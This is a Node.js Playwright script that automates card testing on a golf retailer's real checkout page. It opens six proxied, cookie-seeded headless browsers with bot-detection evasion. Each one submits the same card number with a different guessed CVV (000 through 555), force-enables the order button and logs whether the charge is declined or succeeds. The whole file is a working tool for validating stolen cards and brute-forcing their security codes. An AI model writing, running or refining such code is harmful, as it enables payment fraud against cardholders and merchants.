const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');

// ==========================================
// CONFIGURATIONa
// ==========================================
const COOKIES_FILE_PATH = "/root/killer/backend/gateways/cookies_pool.json";
const SCREENSHOT_DIR = path.join(__dirname, 'screenshots');

if (!fs.existsSync(SCREENSHOT_DIR)) {
    fs.mkdirSync(SCREENSHOT_DIR, { recursive: true });
}

function getCookiesFromPool() {
    if (fs.existsSync(COOKIES_FILE_PATH)) {
        try {
            const rawData = fs.readFileSync(COOKIES_FILE_PATH, 'utf8');
            const data = JSON.parse(rawData);
            return Array.isArray(data) ? data : [];
        } catch (error) { return []; }
    }
    return [];
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

class FujikuraBot {
    constructor(proxyStr = null) {
        this.checkoutUrl = "https://fujikuragolf.com/checkout/";
        this.proxy = this._parseProxy(proxyStr);
    }

    _parseProxy(proxyStr) {
        if (!proxyStr) return null;
        const parts = proxyStr.split(':');
        if (parts.length === 4) {
            return { server: `http://${parts[0]}:${parts[1]}`, username: parts[2], password: parts[3] };
        } else if (parts.length === 2) {
            return { server: `http://${proxyStr}` };
        }
        return null;
    }

    async setupUltraSpeed(page) {
        await page.route("**/*.{png,jpg,jpeg,gif,webp,svg,woff,woff2,ttf}", route => route.abort());
    }

    async handleCookieBanner(page) {
        try {
            const cookieBtn = page.locator("button:has-text('Accept All Cookies'), #onetrust-accept-btn-handler");
            if (await cookieBtn.isVisible()) {
                await cookieBtn.click({ force: true });
                await sleep(500);
            }
        } catch (e) {}
    }

    async captureScreenshot(page, name) {
        try {
            const filename = path.join(SCREENSHOT_DIR, `${name}.png`);
            await page.screenshot({ path: filename, fullPage: true });
            console.log(`📸 Screenshot saved: ${filename}`);
        } catch (e) {}
    }

    /**
     * SELF-HEALING INPUT:
     * Types the number, checks if it's correct. If not, retries.
     */
    async robustInput(page, selector, text, expectedLength) {
        const input = page.locator(selector).first();
        await input.waitFor({ state: 'visible', timeout: 30000 });
        
        for (let attempt = 1; attempt <= 3; attempt++) {
            // 1. Clear
            await input.click({ clickCount: 3 });
            await page.keyboard.press('Backspace');
            await sleep(200);

            // 2. Type (Paste method is safer for parallel)
            const cleanText = text.replace(/\D/g, '');
            await page.keyboard.insertText(cleanText);
            await sleep(300);

            // 3. Verify
            const val = await input.inputValue();
            const currentLen = val.replace(/\D/g, '').length;
            
            if (currentLen >= expectedLength) {
                return true; // Success
            }
            console.log(`⚠️ Input mismatch (${currentLen}/${expectedLength}). Retrying...`);
            await sleep(500);
        }
        return false; // Failed after 3 retries
    }

    async processPayment(page, ccNum, mm, yy, cvv, tabId) {
        const startTime = Date.now();
        try {
            console.log(`[Tab ${tabId}] Processing CVV: ${cvv}...`);
            await page.goto(this.checkoutUrl, { waitUntil: "domcontentloaded", timeout: 90000 });
            await this.handleCookieBanner(page);

            // --- 1. ENTER CARD (With Self-Healing) ---
            await this.robustInput(page, "#cardNumber", ccNum, 15); // Expect at least 15 digits
            
            // Move to Expiry
            await page.keyboard.press('Tab');
            await sleep(200);

            // --- 2. ENTER EXPIRY ---
            // If focus lost, re-click
            const activeId = await page.evaluate(() => document.activeElement.id);
            if (!activeId.includes('expiry')) await page.locator("#expiryDate").click();
            
            const mmStr = mm.toString().padStart(2, '0');
            const yyStr = yy.toString().slice(-2);
            await page.keyboard.type(`${mmStr}${yyStr}`, { delay: 100 });

            // Move to CVC
            await page.keyboard.press('Tab');
            await sleep(200);

            // --- 3. ENTER CVC ---
            const cvcId = await page.evaluate(() => document.activeElement.id);
            if (!cvcId.includes('cvc')) await page.locator("#cvc").click();
            
            await page.keyboard.type(cvv, { delay: 100 });

            // 4. Blur & Wait for Encryption
            await page.mouse.click(10, 10);
            
            console.log(`[Tab ${tabId}] Waiting 10s for encryption...`);
            await sleep(10000); 

            // 5. Submit
            const submitBtn = page.locator("button.place-order, button.wc-block-components-checkout-place-order-button").first();
            await submitBtn.evaluate(btn => {
                btn.removeAttribute('disabled');
                btn.click();
            });
            await page.keyboard.press('Enter');

            // 6. Result Detection
            const errorBanner = ".wc-block-components-notice-banner__content";
            const inlineError = ".wc-block-components-validation-error"; 
            const successPage = ".woocommerce-thankyou-order-received";

            try {
                await page.waitForSelector(`${errorBanner}, ${inlineError}, ${successPage}`, { timeout: 60000 });
                const timeTaken = ((Date.now() - startTime) / 1000).toFixed(2);

                if (await page.locator(errorBanner).isVisible()) {
                    const text = (await page.locator(errorBanner).innerText()).trim();
                    console.log(`[Tab ${tabId}] Banner: ${text}`);
                    await this.captureScreenshot(page, `tab${tabId}_result_${cvv}`);
                    const isDeclined = text.toLowerCase().includes("declined");
                    return { tab: tabId, cvv, status: text, time: `${timeTaken}s`, shouldContinue: isDeclined };
                }

                if (await page.locator(inlineError).isVisible()) {
                    const text = (await page.locator(inlineError).first().innerText()).trim();
                    console.log(`[Tab ${tabId}] Field Error: ${text}`);
                    await this.captureScreenshot(page, `tab${tabId}_field_error_${cvv}`);
                    // If we failed validation despite self-healing, it's a hard fail
                    return { tab: tabId, cvv, status: text, time: `${timeTaken}s`, shouldContinue: false };
                }

                if (await page.locator(successPage).isVisible()) {
                    console.log(`[Tab ${tabId}] ✅ SUCCESS!`);
                    await this.captureScreenshot(page, `tab${tabId}_SUCCESS_${cvv}`);
                    return { tab: tabId, cvv, status: "Success", time: `${timeTaken}s`, shouldContinue: false };
                }

                return { tab: tabId, cvv, status: "Unknown Result", time: `${timeTaken}s`, shouldContinue: false };

            } catch (err) {
                await this.captureScreenshot(page, `tab${tabId}_timeout_${cvv}`);
                return { tab: tabId, cvv, status: "Timeout", shouldContinue: false };
            }
        } catch (err) { return { tab: tabId, cvv, status: `Error: ${err.message}` }; }
    }
}

async function runSingleTab(i, ccParts, proxy, cookieSet) {
    const cvv = (i - 1).toString().repeat(3); 
    const bot = new FujikuraBot(proxy);
    const browser = await chromium.launch({ 
        headless: true, 
        args: ["--disable-blink-features=AutomationControlled", "--no-sandbox"] 
    });
    try {
        const context = await browser.newContext({ proxy: bot.proxy });
        if (cookieSet) {
            await context.addCookies(cookieSet.map(c => ({
                name: c.name, value: c.value, domain: '.fujikuragolf.com', path: '/'
            })));
        }
        const page = await context.newPage();
        await bot.setupUltraSpeed(page);
        return await bot.processPayment(page, ccParts[0], ccParts[1], ccParts[2], cvv, i);
    } finally {
        await sleep(2000);
        await browser.close();
    }
}

async function runFujikuraTask(cc, proxy = null) {
    const pool = getCookiesFromPool();
    if (pool.length < 6) return [{ status: "error", message: `Pool too small` }];
    const parts = cc.split('|');
    const tasks = [];
    console.log(`🚀 Launching Parallel Tabs with Self-Healing Input...`);
    for (let i = 1; i <= 6; i++) {
        tasks.push(runSingleTab(i, parts, proxy, pool[i - 1]));
        await sleep(8000); 
    }
    return await Promise.all(tasks);
}

module.exports = { runFujikuraTask };